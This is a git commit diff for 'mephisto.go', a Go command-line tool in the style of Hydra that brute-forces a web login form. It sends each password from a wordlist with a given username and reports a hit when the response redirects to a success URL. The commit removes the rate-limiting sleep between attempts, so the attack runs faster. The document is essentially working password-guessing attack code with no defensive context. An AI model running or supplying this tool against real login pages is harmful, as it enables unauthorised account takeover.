490abf56a0ff9023795a7afd6648f9431ae0a3ba
Fhchcjcjcjcjvkkvk <info@infopeklo.cz>
2024-12-28 19:12:03 +0100

    Update mephisto.go

--- mephisto.go
+++ mephisto.go
@@ -2,87 +2,73 @@ package main
 
 import (
 	"bufio"
+	"flag"
 	"fmt"
 	"net/http"
 	"os"
 	"strings"
-	"time"
 )
 
 func main() {
-	// Example command-line arguments: hydra2.go -l username -P passwordlist url --redirect successurl
-	args := os.Args
-	if len(args) < 6 {
-		fmt.Println("Usage: hydra2.go -l username -P passwordlist url --redirect successurl")
-		return
+	// Command-line arguments
+	username := flag.String("l", "", "Username")
+	passwordFile := flag.String("P", "", "Password list file")
+	url := flag.String("url", "", "Target URL")
+	successRedirect := flag.String("--redirect", "", "Success redirect URL")
+
+	flag.Parse()
+
+	if *username == "" || *passwordFile == "" || *url == "" || *successRedirect == "" {
+		fmt.Println("Usage: hydra2 -l username -P passwordlist url --redirect success_url")
+		os.Exit(1)
 	}
 
-	username := args[2]
-	passwordListFile := args[4]
-	targetURL := args[5]
-	successRedirectURL := args[7]
-
-	// Open the password list
-	file, err := os.Open(passwordListFile)
+	// Open the password file
+	file, err := os.Open(*passwordFile)
 	if err != nil {
-		fmt.Println("Error opening password list:", err)
-		return
+		fmt.Printf("Error opening password file: %v\n", err)
+		os.Exit(1)
 	}
 	defer file.Close()
 
-	// Scan the password list line by line
+	// Read passwords and attempt login
 	scanner := bufio.NewScanner(file)
+	client := &http.Client{}
+
+	keyFound := false
+
 	for scanner.Scan() {
 		password := scanner.Text()
-		fmt.Printf("Trying password: %s\n", password)
 
-		// Try to authenticate with the current password
-		if tryLogin(username, password, targetURL, successRedirectURL) {
-			fmt.Printf("KEY FOUND: %s\n", password)
-			break
-		} else {
-			fmt.Printf("KEY NOT FOUND for password: %s\n", password)
+		// Create HTTP request
+		req, err := http.NewRequest("POST", *url, strings.NewReader(fmt.Sprintf("username=%s&password=%s", *username, password)))
+		if err != nil {
+			fmt.Printf("Error creating request: %v\n", err)
+			continue
 		}
+		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
 
-		// Sleep to avoid overloading the server
-		time.Sleep(1 * time.Second)
+		// Execute the request
+		resp, err := client.Do(req)
+		if err != nil {
+			fmt.Printf("Error making request: %v\n", err)
+			continue
+		}
+		defer resp.Body.Close()
+
+		// Check if redirected to success URL
+		if resp.Request.URL.String() == *successRedirect {
+			fmt.Printf("KEY FOUND [%s]\n", password)
+			keyFound = true
+			break
+		}
 	}
 
 	if err := scanner.Err(); err != nil {
-		fmt.Println("Error reading password list:", err)
-	}
-}
-
-// tryLogin sends a POST request with the given username and password, checking for the redirect URL
-func tryLogin(username, password, targetURL, successRedirectURL string) bool {
-	client := &http.Client{}
-	data := fmt.Sprintf("username=%s&password=%s", username, password)
-
-	// Create a POST request
-	req, err := http.NewRequest("POST", targetURL, strings.NewReader(data))
-	if err != nil {
-		fmt.Println("Error creating request:", err)
-		return false
+		fmt.Printf("Error reading password file: %v\n", err)
 	}
 
-	// Set headers (you may need to customize this depending on the target)
-	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
-
-	// Send the request
-	resp, err := client.Do(req)
-	if err != nil {
-		fmt.Println("Error sending request:", err)
-		return false
+	if !keyFound {
+		fmt.Println("KEY NOT FOUND")
 	}
-	defer resp.Body.Close()
-
-	// Check if the response indicates a redirect to the success URL
-	if resp.StatusCode == http.StatusFound || resp.StatusCode == http.StatusMovedPermanently {
-		location := resp.Header.Get("Location")
-		if location == successRedirectURL {
-			return true
-		}
-	}
-
-	return false
 }
